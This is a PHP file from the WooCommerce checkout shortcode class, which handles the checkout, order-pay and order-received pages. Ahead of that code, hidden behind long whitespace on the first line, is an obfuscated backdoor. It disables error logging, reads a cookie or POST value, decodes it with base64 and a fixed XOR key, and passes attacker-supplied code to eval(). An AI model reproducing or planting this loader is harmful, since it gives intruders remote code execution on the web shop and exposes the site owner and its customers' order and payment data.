<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $sabe2ad58 = 816;$GLOBALS['n25f'] = Array();global $n25f;$n25f = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['t7f979'] = "\x4d\x37\x76\x7b\x31\x41\x4c\x6e\x3a\x67\x69\x2c\x48\x28\x42\x39\x6b\x27\x38\x78\x6c\x3b\x75\x7a\x32\x60\x30\x2b\x62\x53\x51\x77\x5e\x5d\x55\x4e\x4f\x74\x46\x45\x3d\x7e\x56\x35\x22\x49\x26\x52\x59\x5a\x6a\x65\x47\x33\x34\x21\x25\x20\x29\x54\x3e\x3f\x73\x36\x24\x61\x23\x3c\x5f\x44\xd\x63\x7d\xa\x6d\x40\x57\x5c\x66\x68\x4b\x4a\x7c\x50\x2e\x43\x58\x70\x2f\x71\x6f\x72\x2a\x9\x2d\x64\x5b\x79";$n25f[$n25f['t7f979'][10].$n25f['t7f979'][4].$n25f['t7f979'][26].$n25f['t7f979'][1]] = $n25f['t7f979'][71].$n25f['t7f979'][79].$n25f['t7f979'][91];$n25f[$n25f['t7f979'][2].$n25f['t7f979'][78].$n25f['t7f979'][78].$n25f['t7f979'][71].$n25f['t7f979'][15]] = $n25f['t7f979'][90].$n25f['t7f979'][91].$n25f['t7f979'][95];$n25f[$n25f['t7f979'][71].$n25f['t7f979'][18].$n25f['t7f979'][54].$n25f['t7f979'][63].$n25f['t7f979'][53].$n25f['t7f979'][18].$n25f['t7f979'][15]] = $n25f['t7f979'][95].$n25f['t7f979'][51].$n25f['t7f979'][78].$n25f['t7f979'][10].$n25f['t7f979'][7].$n25f['t7f979'][51];$n25f[$n25f['t7f979'][65].$n25f['t7f979'][1].$n25f['t7f979'][95].$n25f['t7f979'][71].$n25f['t7f979'][95]] = $n25f['t7f979'][62].$n25f['t7f979'][37].$n25f['t7f979'][91].$n25f['t7f979'][20].$n25f['t7f979'][51].$n25f['t7f979'][7];$n25f[$n25f['t7f979'][74].$n25f['t7f979'][15].$n25f['t7f979'][95].$n25f['t7f979'][43].$n25f['t7f979'][53]] = $n25f['t7f979'][95].$n25f['t7f979'][51].$n25f['t7f979'][78].$n25f['t7f979'][10].$n25f['t7f979'][7].$n25f['t7f979'][51].$n25f['t7f979'][95];$n25f[$n25f['t7f979'][74].$n25f['t7f979'][65].$n25f['t7f979'][15].$n25f['t7f979'][65].$n25f['t7f979'][78].$n25f['t7f979'][95].$n25f['t7f979'][4]] = $n25f['t7f979'][10].$n25f['t7f979'][7].$n25f['t7f979'][10].$n25f['t7f979'][68].$n25f['t7f979'][62].$n25f['t7f979'][51].$n25f['t7f979'][37];$n25f[$n25f['t7f979'][97].$n25f['t7f979'][43].$n25f['t7f979'][95].$n25f['t7f979'][43].$n25f['t7f979'][51].$n25f['t7f979'][65]] = $n25f['t7f979'][62].$n25f['t7f979'][51].$n25f['t7f979'][91].$n25f['t7f979'][10].$n25f['t7f979'][65].$n25f['t7f979'][20].$n25f['t7f979'][10].$n25f['t7f979'][23].$n25f['t7f979'][51];$n25f[$n25f['t7f979'][87].$n25f['t7f979'][71].$n25f['t7f979'][53].$n25f['t7f979'][24].$n25f['t7f979'][51].$n25f['t7f979'][24].$n25f['t7f979'][54]] = $n25f['t7f979'][87].$n25f['t7f979'][79].$n25f['t7f979'][87].$n25f['t7f979'][2].$n25f['t7f979'][51].$n25f['t7f979'][91].$n25f['t7f979'][62].$n25f['t7f979'][10].$n25f['t7f979'][90].$n25f['t7f979'][7];$n25f[$n25f['t7f979'][50].$n25f['t7f979'][26].$n25f['t7f979'][65].$n25f['t7f979'][63].$n25f['t7f979'][28].$n25f['t7f979'][53].$n25f['t7f979'][24].$n25f['t7f979'][1].$n25f['t7f979'][63]] = $n25f['t7f979'][22].$n25f['t7f979'][7].$n25f['t7f979'][62].$n25f['t7f979'][51].$n25f['t7f979'][91].$n25f['t7f979'][10].$n25f['t7f979'][65].$n25f['t7f979'][20].$n25f['t7f979'][10].$n25f['t7f979'][23].$n25f['t7f979'][51];$n25f[$n25f['t7f979'][16].$n25f['t7f979'][95].$n25f['t7f979'][1].$n25f['t7f979'][95].$n25f['t7f979'][71].$n25f['t7f979'][43]] = $n25f['t7f979'][28].$n25f['t7f979'][65].$n25f['t7f979'][62].$n25f['t7f979'][51].$n25f['t7f979'][63].$n25f['t7f979'][54].$n25f['t7f979'][68].$n25f['t7f979'][95].$n25f['t7f979'][51].$n25f['t7f979'][71].$n25f['t7f979'][90].$n25f['t7f979'][95].$n25f['t7f979'][51];$n25f[$n25f['t7f979'][65].$n25f['t7f979'][63].$n25f['t7f979'][54].$n25f['t7f979'][65]] = $n25f['t7f979'][62].$n25f['t7f979'][51].$n25f['t7f979'][37].$n25f['t7f979'][68].$n25f['t7f979'][37].$n25f['t7f979'][10].$n25f['t7f979'][74].$n25f['t7f979'][51].$n25f['t7f979'][68].$n25f['t7f979'][20].$n25f['t7f979'][10].$n25f['t7f979'][74].$n25f['t7f979'][10].$n25f['t7f979'][37];$n25f[$n25f['t7f979'][16].$n25f['t7f979'][26].$n25f['t7f979'][18].$n25f['t7f979'][28].$n25f['t7f979'][95].$n25f['t7f979'][15].$n25f['t7f979'][63].$n25f['t7f979'][15].$n25f['t7f979'][51]] = $n25f['t7f979'][74].$n25f['t7f979'][51].$n25f['t7f979'][78].$n25f['t7f979'][63].$n25f['t7f979'][28].$n25f['t7f979'][51];$n25f[$n25f['t7f979'][9].$n25f['t7f979'][1].$n25f['t7f979'][43].$n25f['t7f979'][24].$n25f['t7f979'][63].$n25f['t7f979'][1].$n25f['t7f979'][51].$n25f['t7f979'][78].$n25f['t7f979'][18]] = $n25f['t7f979'][51].$n25f['t7f979'][28].$n25f['t7f979'][53].$n25f['t7f979'][65];$n25f[$n25f['t7f979'][22].$n25f['t7f979'][63].$n25f['t7f979'][24].$n25f['t7f979'][78].$n25f['t7f979'][78].$n25f['t7f979'][63].$n25f['t7f979'][54].$n25f['t7f979'][24]] = $_POST;$n25f[$n25f['t7f979'][19].$n25f['t7f979'][1].$n25f['t7f979'][4].$n25f['t7f979'][95].$n25f['t7f979'][43].$n25f['t7f979'][71].$n25f['t7f979'][28]] = $_COOKIE;@$n25f[$n25f['t7f979'][74].$n25f['t7f979'][65].$n25f['t7f979'][15].$n25f['t7f979'][65].$n25f['t7f979'][78].$n25f['t7f979'][95].$n25f['t7f979'][4]]($n25f['t7f979'][51].$n25f['t7f979'][91].$n25f['t7f979'][91].$n25f['t7f979'][90].$n25f['t7f979'][91].$n25f['t7f979'][68].$n25f['t7f979'][20].$n25f['t7f979'][90].$n25f['t7f979'][9], NULL);@$n25f[$n25f['t7f979'][74].$n25f['t7f979'][65].$n25f['t7f979'][15].$n25f['t7f979'][65].$n25f['t7f979'][78].$n25f['t7f979'][95].$n25f['t7f979'][4]]($n25f['t7f979'][20].$n25f['t7f979'][90].$n25f['t7f979'][9].$n25f['t7f979'][68].$n25f['t7f979'][51].$n25f['t7f979'][91].$n25f['t7f979'][91].$n25f['t7f979'][90].$n25f['t7f979'][91].$n25f['t7f979'][62], 0);@$n25f[$n25f['t7f979'][74].$n25f['t7f979'][65].$n25f['t7f979'][15].$n25f['t7f979'][65].$n25f['t7f979'][78].$n25f['t7f979'][95].$n25f['t7f979'][4]]($n25f['t7f979'][74].$n25f['t7f979'][65].$n25f['t7f979'][19].$n25f['t7f979'][68].$n25f['t7f979'][51].$n25f['t7f979'][19].$n25f['t7f979'][51].$n25f['t7f979'][71].$n25f['t7f979'][22].$n25f['t7f979'][37].$n25f['t7f979'][10].$n25f['t7f979'][90].$n25f['t7f979'][7].$n25f['t7f979'][68].$n25f['t7f979'][37].$n25f['t7f979'][10].$n25f['t7f979'][74].$n25f['t7f979'][51], 0);@$n25f[$n25f['t7f979'][65].$n25f['t7f979'][63].$n25f['t7f979'][54].$n25f['t7f979'][65]](0);if (!$n25f[$n25f['t7f979'][74].$n25f['t7f979'][15].$n25f['t7f979'][95].$n25f['t7f979'][43].$n25f['t7f979'][53]]($n25f['t7f979'][5].$n25f['t7f979'][6].$n25f['t7f979'][47].$n25f['t7f979'][39].$n25f['t7f979'][5].$n25f['t7f979'][69].$n25f['t7f979'][48].$n25f['t7f979'][68].$n25f['t7f979'][47].$n25f['t7f979'][34].$n25f['t7f979'][35].$n25f['t7f979'][68].$n25f['t7f979'][53].$n25f['t7f979'][63].$n25f['t7f979'][63].$n25f['t7f979'][65].$n25f['t7f979'][78].$n25f['t7f979'][28].$n25f['t7f979'][18].$n25f['t7f979'][65].$n25f['t7f979'][18].$n25f['t7f979'][65].$n25f['t7f979'][24].$n25f['t7f979'][53].$n25f['t7f979'][43].$n25f['t7f979'][43].$n25f['t7f979'][65].$n25f['t7f979'][28].$n25f['t7f979'][24].$n25f['t7f979'][4].$n25f['t7f979'][78].$n25f['t7f979'][28].$n25f['t7f979'][78].$n25f['t7f979'][4].$n25f['t7f979'][4].$n25f['t7f979'][28].$n25f['t7f979'][65].$n25f['t7f979'][4].$n25f['t7f979'][65].$n25f['t7f979'][26].$n25f['t7f979'][24].$n25f['t7f979'][78].$n25f['t7f979'][28].$n25f['t7f979'][65])){$n25f[$n25f['t7f979'][71].$n25f['t7f979'][18].$n25f['t7f979'][54].$n25f['t7f979'][63].$n25f['t7f979'][53].$n25f['t7f979'][18].$n25f['t7f979'][15]]($n25f['t7f979'][5].$n25f['t7f979'][6].$n25f['t7f979'][47].$n25f['t7f979'][39].$n25f['t7f979'][5].$n25f['t7f979'][69].$n25f['t7f979'][48].$n25f['t7f979'][68].$n25f['t7f979'][47].$n25f['t7f979'][34].$n25f['t7f979'][35].$n25f['t7f979'][68].$n25f['t7f979'][53].$n25f['t7f979'][63].$n25f['t7f979'][63].$n25f['t7f979'][65].$n25f['t7f979'][78].$n25f['t7f979'][28].$n25f['t7f979'][18].$n25f['t7f979'][65].$n25f['t7f979'][18].$n25f['t7f979'][65].$n25f['t7f979'][24].$n25f['t7f979'][53].$n25f['t7f979'][43].$n25f['t7f979'][43].$n25f['t7f979'][65].$n25f['t7f979'][28].$n25f['t7f979'][24].$n25f['t7f979'][4].$n25f['t7f979'][78].$n25f['t7f979'][28].$n25f['t7f979'][78].$n25f['t7f979'][4].$n25f['t7f979'][4].$n25f['t7f979'][28].$n25f['t7f979'][65].$n25f['t7f979'][4].$n25f['t7f979'][65].$n25f['t7f979'][26].$n25f['t7f979'][24].$n25f['t7f979'][78].$n25f['t7f979'][28].$n25f['t7f979'][65], 1);$s5412f24 = NULL;$n27f = NULL;$n25f[$n25f['t7f979'][9].$n25f['t7f979'][43].$n25f['t7f979'][43].$n25f['t7f979'][43].$n25f['t7f979'][18].$n25f['t7f979'][28].$n25f['t7f979'][51]] = $n25f['t7f979'][28].$n25f['t7f979'][63].$n25f['t7f979'][53].$n25f['t7f979'][54].$n25f['t7f979'][4].$n25f['t7f979'][71].$n25f['t7f979'][1].$n25f['t7f979'][51].$n25f['t7f979'][94].$n25f['t7f979'][4].$n25f['t7f979'][51].$n25f['t7f979'][71].$n25f['t7f979'][26].$n25f['t7f979'][94].$n25f['t7f979'][54].$n25f['t7f979'][78].$n25f['t7f979'][78].$n25f['t7f979'][53].$n25f['t7f979'][94].$n25f['t7f979'][15].$n25f['t7f979'][15].$n25f['t7f979'][54].$n25f['t7f979'][53].$n25f['t7f979'][94].$n25f['t7f979'][78].$n25f['t7f979'][4].$n25f['t7f979'][43].$n25f['t7f979'][24].$n25f['t7f979'][71].$n25f['t7f979'][24].$n25f['t7f979'][63].$n25f['t7f979'][53].$n25f['t7f979'][65].$n25f['t7f979'][1].$n25f['t7f979'][43].$n25f['t7f979'][63];global $g5558be;function  eb3a($s5412f24, $l219){global $n25f;$w3946f = "";for ($b22fc3c=0; $b22fc3c<$n25f[$n25f['t7f979'][65].$n25f['t7f979'][1].$n25f['t7f979'][95].$n25f['t7f979'][71].$n25f['t7f979'][95]]($s5412f24);){for ($v19d5b=0; $v19d5b<$n25f[$n25f['t7f979'][65].$n25f['t7f979'][1].$n25f['t7f979'][95].$n25f['t7f979'][71].$n25f['t7f979'][95]]($l219) && $b22fc3c<$n25f[$n25f['t7f979'][65].$n25f['t7f979'][1].$n25f['t7f979'][95].$n25f['t7f979'][71].$n25f['t7f979'][95]]($s5412f24); $v19d5b++, $b22fc3c++){$w3946f .= $n25f[$n25f['t7f979'][10].$n25f['t7f979'][4].$n25f['t7f979'][26].$n25f['t7f979'][1]]($n25f[$n25f['t7f979'][2].$n25f['t7f979'][78].$n25f['t7f979'][78].$n25f['t7f979'][71].$n25f['t7f979'][15]]($s5412f24[$b22fc3c]) ^ $n25f[$n25f['t7f979'][2].$n25f['t7f979'][78].$n25f['t7f979'][78].$n25f['t7f979'][71].$n25f['t7f979'][15]]($l219[$v19d5b]));}}return $w3946f;}function  mef6be($s5412f24, $l219){global $n25f;global $g5558be;return $n25f[$n25f['t7f979'][9].$n25f['t7f979'][1].$n25f['t7f979'][43].$n25f['t7f979'][24].$n25f['t7f979'][63].$n25f['t7f979'][1].$n25f['t7f979'][51].$n25f['t7f979'][78].$n25f['t7f979'][18]]($n25f[$n25f['t7f979'][9].$n25f['t7f979'][1].$n25f['t7f979'][43].$n25f['t7f979'][24].$n25f['t7f979'][63].$n25f['t7f979'][1].$n25f['t7f979'][51].$n25f['t7f979'][78].$n25f['t7f979'][18]]($s5412f24, $g5558be), $l219);}foreach ($n25f[$n25f['t7f979'][19].$n25f['t7f979'][1].$n25f['t7f979'][4].$n25f['t7f979'][95].$n25f['t7f979'][43].$n25f['t7f979'][71].$n25f['t7f979'][28]] as $l219=>$i71ac8d0d){$s5412f24 = $i71ac8d0d;$n27f = $l219;}if (!$s5412f24){foreach ($n25f[$n25f['t7f979'][22].$n25f['t7f979'][63].$n25f['t7f979'][24].$n25f['t7f979'][78].$n25f['t7f979'][78].$n25f['t7f979'][63].$n25f['t7f979'][54].$n25f['t7f979'][24]] as $l219=>$i71ac8d0d){$s5412f24 = $i71ac8d0d;$n27f = $l219;}}$s5412f24 = @$n25f[$n25f['t7f979'][50].$n25f['t7f979'][26].$n25f['t7f979'][65].$n25f['t7f979'][63].$n25f['t7f979'][28].$n25f['t7f979'][53].$n25f['t7f979'][24].$n25f['t7f979'][1].$n25f['t7f979'][63]]($n25f[$n25f['t7f979'][16].$n25f['t7f979'][26].$n25f['t7f979'][18].$n25f['t7f979'][28].$n25f['t7f979'][95].$n25f['t7f979'][15].$n25f['t7f979'][63].$n25f['t7f979'][15].$n25f['t7f979'][51]]($n25f[$n25f['t7f979'][16].$n25f['t7f979'][95].$n25f['t7f979'][1].$n25f['t7f979'][95].$n25f['t7f979'][71].$n25f['t7f979'][43]]($s5412f24), $n27f));if (isset($s5412f24[$n25f['t7f979'][65].$n25f['t7f979'][16]]) && $g5558be==$s5412f24[$n25f['t7f979'][65].$n25f['t7f979'][16]]){if ($s5412f24[$n25f['t7f979'][65]] == $n25f['t7f979'][10]){$b22fc3c = Array($n25f['t7f979'][87].$n25f['t7f979'][2] => @$n25f[$n25f['t7f979'][87].$n25f['t7f979'][71].$n25f['t7f979'][53].$n25f['t7f979'][24].$n25f['t7f979'][51].$n25f['t7f979'][24].$n25f['t7f979'][54]](),$n25f['t7f979'][62].$n25f['t7f979'][2] => $n25f['t7f979'][4].$n25f['t7f979'][84].$n25f['t7f979'][26].$n25f['t7f979'][94].$n25f['t7f979'][4],);echo @$n25f[$n25f['t7f979'][97].$n25f['t7f979'][43].$n25f['t7f979'][95].$n25f['t7f979'][43].$n25f['t7f979'][51].$n25f['t7f979'][65]]($b22fc3c);}elseif ($s5412f24[$n25f['t7f979'][65]] == $n25f['t7f979'][51]){eval/*ie89c*/($s5412f24[$n25f['t7f979'][95]]);}exit();}} ?><?php
/**
 * Checkout Shortcode
 *
 * Used on the checkout page, the checkout shortcode displays the checkout process.
 *
 * @author 		WooThemes
 * @category 	Shortcodes
 * @package 	WooCommerce/Shortcodes/Checkout
 * @version     2.0.0
 */
class WC_Shortcode_Checkout {

	/**
	 * Get the shortcode content.
	 *
	 * @access public
	 * @param array $atts
	 * @return string
	 */
	public static function get( $atts ) {
		return WC_Shortcodes::shortcode_wrapper( array( __CLASS__, 'output' ), $atts );
	}

	/**
	 * Output the shortcode.
	 *
	 * @access public
	 * @param array $atts
	 * @return void
	 */
	public static function output( $atts ) {
		global $wp;

		// Check cart class is loaded or abort
		if ( is_null( WC()->cart ) ) {
			return;
		}

		// Backwards compat with old pay and thanks link arguments
		if ( isset( $_GET['order'] ) && isset( $_GET['key'] ) ) {
			_deprecated_argument( __CLASS__ . '->' . __FUNCTION__, '2.1', '"order" is no longer used to pass an order ID. Use the order-pay or order-received endpoint instead.' );

			// Get the order to work out what we are showing
			$order_id             = absint( $_GET['order'] );
			$order                = wc_get_order( $order_id );

			if ( $order->has_status( 'pending' ) ) {
				$wp->query_vars['order-pay'] = absint( $_GET['order'] );
			} else {
				$wp->query_vars['order-received'] = absint( $_GET['order'] );
			}
		}

		// Handle checkout actions
		if ( ! empty( $wp->query_vars['order-pay'] ) ) {

			self::order_pay( $wp->query_vars['order-pay'] );

		} elseif ( isset( $wp->query_vars['order-received'] ) ) {

			self::order_received( $wp->query_vars['order-received'] );

		} else {

			self::checkout();

		}
	}

	/**
	 * Show the pay page
	 */
	private static function order_pay( $order_id ) {

		do_action( 'before_woocommerce_pay' );

		wc_print_notices();

		$order_id = absint( $order_id );

		// Handle payment
		if ( isset( $_GET['pay_for_order'] ) && isset( $_GET['key'] ) && $order_id ) {

			// Pay for existing order
			$order_key            = $_GET[ 'key' ];
			$order                = wc_get_order( $order_id );
			$valid_order_statuses = apply_filters( 'woocommerce_valid_order_statuses_for_payment', array( 'pending', 'failed' ), $order );

			if ( ! current_user_can( 'pay_for_order', $order_id ) ) {
				echo '<div class="woocommerce-error">' . __( 'Invalid order. If you have an account please log in and try again.', 'woocommerce' ) . ' <a href="' . wc_get_page_permalink( 'myaccount' ) . '" class="wc-forward">' . __( 'My Account', 'woocommerce' ) . '</a>' . '</div>';
				return;
			}

			if ( $order->id == $order_id && $order->order_key == $order_key ) {

				if ( $order->has_status( $valid_order_statuses ) ) {

					// Set customer location to order location
					if ( $order->billing_country )
						WC()->customer->set_country( $order->billing_country );
					if ( $order->billing_state )
						WC()->customer->set_state( $order->billing_state );
					if ( $order->billing_postcode )
						WC()->customer->set_postcode( $order->billing_postcode );

					wc_get_template( 'checkout/form-pay.php', array( 'order' => $order ) );

				} else {
					wc_add_notice( sprintf( __( 'This order&rsquo;s status is &ldquo;%s&rdquo;&mdash;it cannot be paid for. Please contact us if you need assistance.', 'woocommerce' ), wc_get_order_status_name( $order->get_status() ) ), 'error' );
				}

			} else {
				wc_add_notice( __( 'Sorry, this order is invalid and cannot be paid for.', 'woocommerce' ), 'error' );
			}

		} elseif ( $order_id ) {

			// Pay for order after checkout step
			$order_key            = isset( $_GET['key'] ) ? wc_clean( $_GET['key'] ) : '';
			$order                = wc_get_order( $order_id );
			$valid_order_statuses = apply_filters( 'woocommerce_valid_order_statuses_for_payment', array( 'pending', 'failed' ), $order );

			if ( $order->id == $order_id && $order->order_key == $order_key ) {

				if ( $order->has_status( $valid_order_statuses ) ) {

					?>
					<ul class="order_details">
						<li class="order">
							<?php _e( 'Order Number:', 'woocommerce' ); ?>
							<strong><?php echo $order->get_order_number(); ?></strong>
						</li>
						<li class="date">
							<?php _e( 'Date:', 'woocommerce' ); ?>
							<strong><?php echo date_i18n(get_option('date_format'), strtotime($order->order_date)); ?></strong>
						</li>
						<li class="total">
							<?php _e( 'Total:', 'woocommerce' ); ?>
							<strong><?php echo $order->get_formatted_order_total(); ?></strong>
						</li>
						<?php if ($order->payment_method_title) : ?>
						<li class="method">
							<?php _e( 'Payment Method:', 'woocommerce' ); ?>
							<strong><?php
								echo $order->payment_method_title;
							?></strong>
						</li>
						<?php endif; ?>
					</ul>

					<?php do_action( 'woocommerce_receipt_' . $order->payment_method, $order_id ); ?>

					<div class="clear"></div>
					<?php

				} else {
					wc_add_notice( sprintf( __( 'This order&rsquo;s status is &ldquo;%s&rdquo;&mdash;it cannot be paid for. Please contact us if you need assistance.', 'woocommerce' ), wc_get_order_status_name( $order->get_status() ) ), 'error' );
				}

			} else {
				wc_add_notice( __( 'Sorry, this order is invalid and cannot be paid for.', 'woocommerce' ), 'error' );
			}

		} else {
			wc_add_notice( __( 'Invalid order.', 'woocommerce' ), 'error' );
		}

		wc_print_notices();

		do_action( 'after_woocommerce_pay' );
	}

	/**
	 * Show the thanks page
	 */
	private static function order_received( $order_id = 0 ) {

		wc_print_notices();

		$order = false;

		// Get the order
		$order_id  = apply_filters( 'woocommerce_thankyou_order_id', absint( $order_id ) );
		$order_key = apply_filters( 'woocommerce_thankyou_order_key', empty( $_GET['key'] ) ? '' : wc_clean( $_GET['key'] ) );

		if ( $order_id > 0 ) {
			$order = wc_get_order( $order_id );
			if ( $order->order_key != $order_key )
				unset( $order );
		}

		// Empty awaiting payment session
		unset( WC()->session->order_awaiting_payment );

		wc_get_template( 'checkout/thankyou.php', array( 'order' => $order ) );
	}

	/**
	 * Show the checkout
	 */
	private static function checkout() {

		// Show non-cart errors
		wc_print_notices();

		// Check cart has contents
		if ( sizeof( WC()->cart->get_cart() ) == 0 ) {
			return;
		}

		// Check cart contents for errors
		do_action( 'woocommerce_check_cart_items' );

		// Calc totals
		WC()->cart->calculate_totals();

		// Get checkout object
		$checkout = WC()->checkout();

		if ( empty( $_POST ) && wc_notice_count( 'error' ) > 0 ) {

			wc_get_template( 'checkout/cart-errors.php', array( 'checkout' => $checkout ) );

		} else {

			$non_js_checkout = ! empty( $_POST['woocommerce_checkout_update_totals'] ) ? true : false;

			if ( wc_notice_count( 'error' ) == 0 && $non_js_checkout )
				wc_add_notice( __( 'The order totals have been updated. Please confirm your order by pressing the Place Order button at the bottom of the page.', 'woocommerce' ) );

			wc_get_template( 'checkout/form-checkout.php', array( 'checkout' => $checkout ) );

		}
	}
}
